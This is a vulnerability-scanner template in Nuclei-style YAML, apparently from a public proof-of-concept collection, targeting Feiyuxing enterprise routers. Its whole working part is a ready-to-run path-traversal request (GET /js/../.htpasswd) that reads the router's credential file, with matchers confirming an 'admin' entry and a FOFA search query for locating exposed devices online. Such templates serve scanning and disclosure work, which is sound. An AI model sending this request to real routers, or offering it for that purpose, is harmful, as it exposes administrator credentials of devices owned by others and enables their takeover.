id: feiyuxing-htpasswd-disclosure
info:
  name: 飞鱼星路由器 htpasswd - 敏感信息泄露
  author: leadlife
  severity: high
  description: 成都飞鱼星科技股份有限公司成立于2002年，公司现有全场景（行业）无线网络解决方案、公安审计解决方案、星云平台、企业级无线路由器、企业上网行为管理路由、智能家居解决方案、全屋Wi-Fi覆盖方案、安防监控交换机等产品及方案，致力于提供智能易用的网络通讯产品与服务，通过创新技术不断提升网络使用质量，为用户创建智能、高效、人性化的网络管理平台。飞鱼星-路由器存在敏感信息泄露漏洞
  reference: 
    - https://github.com/wy876/POC/blob/main/%E9%A3%9E%E9%B1%BC%E6%98%9F/%E9%A3%9E%E9%B1%BC%E6%98%9F-%E8%B7%AF%E7%94%B1%E5%99%A8%E5%AD%98%E5%9C%A8%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E.md
  metadata:
    verified: true
    max-request: 1
    fofa-query: title="飞鱼星企业" && title="飞鱼星企业级智能上网行为管理系统" || body="js/select2css.js"
    hunter-query: demo
    tips:
    repair:
    version:
  tags: 2024,disclosure,feiyuxing,iot,router

http:
  - raw:
      - |
        GET /js/../.htpasswd HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body,'admin')
          - contains(header, 'Router')
        condition: and